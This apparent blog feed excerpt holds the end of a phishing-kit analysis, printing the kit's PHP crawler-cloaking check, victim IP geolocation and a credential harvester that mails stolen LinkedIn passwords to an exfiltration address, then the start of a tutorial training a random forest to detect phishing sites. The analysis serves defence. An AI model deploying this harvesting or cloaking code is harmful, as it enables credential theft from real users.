               &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP/1.0 404 Not Found&amp;#39;&lt;/span&gt;);
               &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;h1&amp;gt;404 Not Found&amp;lt;/h1&amp;gt;The page that you have requested could not be found.&amp;#34;&lt;/span&gt;);
          }
     }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;strpos&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;google&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strpos&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msnbot&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strpos&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Yahoo! Slurp&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;or&lt;/span&gt; [&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;] ) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) { &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP/1.0 404 Not Found&amp;#39;&lt;/span&gt;); &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;; }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As seen in the code, the access is granted only if hostname, IP address and User-Agent string of the client are not included in a list of harcoded values. A &lt;em&gt;404 Not Found&lt;/em&gt; error is shown otherwise.&lt;/p&gt;
&lt;p&gt;Note that many of the hardcoded values contained in &lt;code&gt;bannedIP&lt;/code&gt; and in the User-Agent check were omitted from the lines above to make the code more readable.&lt;/p&gt;
&lt;h2 id=&#34;the-phishing-page&#34;&gt;The phishing page&lt;/h2&gt;
&lt;p&gt;We already saw that &lt;code&gt;index.php&lt;/code&gt; redirects the client into the folder with a random name: this contains the same files of the &lt;code&gt;LinkedIn&lt;/code&gt; folder found in the kit. The purpose of this trick is to have a different URL for every execution of &lt;code&gt;index.php&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I didn&amp;rsquo;t find an online instance of the kit, but we can use &lt;code&gt;php&lt;/code&gt; to run it locally:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;php -S localhost:8000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If we go to &lt;code&gt;localhost:8000&lt;/code&gt;, the connection will be redirected to a page similar to this:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep2/contentphplocal.png&#34;
         alt=&#34;Local deployment of this phishing kit&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Local deployment of this phishing kit&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;You can see that the URL contains the random &lt;em&gt;md5&lt;/em&gt; string obtained in &lt;code&gt;index.php&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s take a look at the PHP code of the phishing page:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
$emai &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;];
$IP &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;];
$geopluginURL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.geoplugin.net/php.gp?ip=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$IP;
$addrDetailsArr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($geopluginURL));
$city &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $addrDetailsArr[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;geoplugin_city&amp;#39;&lt;/span&gt;];
$country &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $addrDetailsArr[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;geoplugin_countryName&amp;#39;&lt;/span&gt;];

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$city){
   $city&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Not Define&amp;#39;&lt;/span&gt;;
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$country){
   $country&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Not Define&amp;#39;&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this first part, the IP address and the location information of the client are gathered. Again, we see the use of geoplugin (and again, with the old address geoplugin.net) in order to infer the city and the country from the IP address.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($_POST &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;], $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;])){
    $ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
    $email_to &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;simon@wmbrep.biz&amp;#34;&lt;/span&gt;;
    $email_subject &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Linked&amp;#34;&lt;/span&gt;;
    $email_from &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;simon-walter&amp;#34;&lt;/span&gt;;
    $email &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;];
    $pass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;];
    $cpass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cpass&amp;#39;&lt;/span&gt;];
    $email_message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Email: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;($email)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $email_message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;($pass)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $email_message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;IP: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;($ip)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $email_message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Country: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;($country)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $email_message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;City: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;($city)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;From: &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$email_from&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This part of the code defines the options for sending the email. We can see the exfiltration email where all the stolen credentials will be sent (&lt;code&gt;simon@wmbrep.biz&lt;/code&gt;), the header of &lt;em&gt;email_from&lt;/em&gt; containing &lt;code&gt;simon-walter&lt;/code&gt; as well as the subject (&lt;em&gt;Linked&lt;/em&gt;) and the message of the email, which - as expected - contains the email address, password, IP address, country and city of the victim.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$email) {
        $emailErr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please enter your  Email&amp;#34;&lt;/span&gt;;
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;elseif&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$email &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/^\S+@\S+$/&amp;#34;&lt;/span&gt;, $email)) {
        $emailErr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please enter a valid Email&amp;#34;&lt;/span&gt;;
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;elseif&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$pass) {
        $passErr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password is required&amp;#34;&lt;/span&gt;;
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;elseif&lt;/span&gt;($pass &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; $cpass){
        $cpassErr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Both Passwords Must Match&amp;#34;&lt;/span&gt;;
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        $gotten &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Login Error,Wrong Email or Password, Try Again&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;mail&lt;/span&gt;($email_to, $email_subject, $email_message, $headers);
    }
}&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In these last lines, the string contained in the email address input field is checked against a regular expression to determine if it is a valid email address; an error message is shown otherwise. There are also two additional checks for the password (if the password is entered and if it is the same in the &lt;em&gt;Password&lt;/em&gt; input field and in the &lt;em&gt;Confirm Password&lt;/em&gt; one). The email is then sent as usual with the PHP function &lt;code&gt;mail()&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In this post we analyzed &lt;code&gt;content.zip&lt;/code&gt;: a phishing kit which tricks victims into giving their LinkedIn credentials and pretends to provide a feature to &lt;em&gt;&amp;lsquo;send your business catalogues and quotes via LinkedIn&amp;rsquo;&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;While the exfiltration method used is somehow similar to the one we saw in &lt;a href=&#34;https://andpalmier.github.io/posts/phishing-findings-1/&#34;&gt;the first episode of this series&lt;/a&gt;, this analysis provides interesting findings, especially with the &lt;em&gt;&amp;lsquo;hiding techniques&amp;rsquo;&lt;/em&gt; used with: &lt;code&gt;robots.txt&lt;/code&gt;, &lt;code&gt;.htaccess&lt;/code&gt; and &lt;code&gt;blocker.php&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Even if the phishing page is always the same, the kit puts it in a new URL at every new visit; so that every victim will have a different URL. The kit also provides logging capabilities for IP address of the victims in &lt;code&gt;vu.txt&lt;/code&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Machine Learning and phishing, pt.2: random forest</title>
      <link>/posts/ml-with-phishing-ep2/</link>
      <pubDate>Wed, 17 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>/posts/ml-with-phishing-ep2/</guid>
      <description>&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/jaws.jpg&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;I started hunting and reporting phishing pages on Twitter, follow me &lt;a href=&#34;https://twitter.com/andpalmier&#34;&gt;here&lt;/a&gt; if you are interested! After some digging, I have decided that it would be interesting to use this topic to refresh my memory around the basics of Machine Learning.&lt;/p&gt;
&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://andpalmier.github.io/posts/ml-with-phishing-ep1/&#34;&gt;In the last post of this series&lt;/a&gt;, we analyzed how some of the parameters of a decision tree could improve the accuracy of the model when classifying phishing sites. In this second post, we will perform a similar analysis, but with a different classifier: random forest.&lt;/p&gt;
&lt;p&gt;A random forest classifier is made of a number of decision trees which operate as an ensemble. The idea behind random forest is simple: every tree in the forest works independently as a classifier; then - based on the task which was submitted - the prediction of the forest is either the average of the predictions of the trees or the one with the most votes.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/ep2/randomforest.png&#34;
         alt=&#34;Random forest in action&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Random forest in action&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h2 id=&#34;random-forest-against-phishing&#34;&gt;Random forest against phishing&lt;/h2&gt;
&lt;p&gt;We will start the analysis by importing the libraries and the dataset which are going to be used in this post:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; numpy &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; np
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; matplotlib.legend_handler &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; HandlerLine2D
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; sklearn.ensemble &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; RandomForestClassifier
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; matplotlib.pyplot &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; plt

&lt;span style=&#34;color:#75715e&#34;&gt;# Load the data from a CSV file&lt;/span&gt;
train_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;genfromtxt(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;phishing_smaller.csv&amp;#39;&lt;/span&gt;, delimiter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;, dtype&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;int32)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our dataset contains 10.000 samples and 11 columns, where 10 represent the features and the last one is the label of the sample.&lt;/p&gt;
&lt;p&gt;As for the previous episode, I used a smaller version of a dataset which was created for &lt;a href=&#34;https://www.sciencedirect.com/science/article/pii/S0020025519300763&#34;&gt;this study&lt;/a&gt;. You can find the version of the dataset used in this post &lt;a href=&#34;https://github.com/andpalmier/MLWithPhishing&#34;&gt;in this GitHub repository&lt;/a&gt;, which contains also information about the features selected and the code of this post in form of a Jupyter notebook.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# inputs are in all columns except the last one&lt;/span&gt;
inputs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; train_data[:,:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]

&lt;span style=&#34;color:#75715e&#34;&gt;# outputs in the last column&lt;/span&gt;
outputs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; train_data[:, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;StratifiedKFold&lt;/code&gt; will be used in order to keep the frequency of the classes constant during our k-fold cross-validation. It is important to note that &lt;code&gt;random_state&lt;/code&gt; is set not only for the k-fold validation, but also in the random forest classifier: this will ensure a reproducible setup for all iterations of the model.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; sklearn.model_selection &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; StratifiedKFold

&lt;span style=&#34;color:#75715e&#34;&gt;# use 10-fold with random_state set to 0&lt;/span&gt;
skf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; StratifiedKFold(n_splits&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, shuffle&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As in the other post, we will use AUC (Area Under Curve) to evaluate the accuracy of our classifier; so let&amp;rsquo;s import the required library and define the array to store the accuracy during the iterations with the different folds:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# library for evaluating the classifier&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sklearn.metrics &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; metrics

&lt;span style=&#34;color:#75715e&#34;&gt;# list to store the accuracy during k-fold cross-validation&lt;/span&gt;
accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We will now loop through the 10 splits and use them to train and evaluate 10 different models. The accuracy of these models will be stored in the &lt;code&gt;accuracy&lt;/code&gt; list.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# loop with splits&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; train_index, test_index &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; skf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(inputs, outputs):

    &lt;span style=&#34;color:#75715e&#34;&gt;# 9 folds used for training&lt;/span&gt;
    x_train, x_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inputs[train_index], inputs[test_index]
    &lt;span style=&#34;color:#75715e&#34;&gt;# 1 fold for testing&lt;/span&gt;
    y_train, y_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; outputs[train_index], outputs[test_index]

    &lt;span style=&#34;color:#75715e&#34;&gt;# Creates the classifier&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# random_state is to keep same setup&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# n_jobs is -1 to use all the processors&lt;/span&gt;
    rf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RandomForestClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, n_jobs&lt;span style=&#34;color:#f92672&#34;&gt;=-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

    &lt;span style=&#34;color:#75715e&#34;&gt;# Train the classifier&lt;/span&gt;
    rf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fit(x_train, y_train)

    &lt;span style=&#34;color:#75715e&#34;&gt;# Test the classifier&lt;/span&gt;
    predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(x_test)
    false_positives, true_positives, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
        metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_test, predictions)

    &lt;span style=&#34;color:#75715e&#34;&gt;# calculate classifier accuracy&lt;/span&gt;
    ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positives, true_positives)
    accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(accuracy,ROC_AUC)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;n_jobs&lt;/code&gt; parameter of the classifier defines the number of jobs to run in parallel over the trees. If set to &lt;code&gt;None&lt;/code&gt; (which is the case by default) it means 1, while if set to -1 it will use all processors.&lt;/p&gt;
&lt;p&gt;In order to evaluate our model trained with k-folds, we will take the mean of the accuracy of the 10 values generated in the previous steps:&lt;/p&gt;
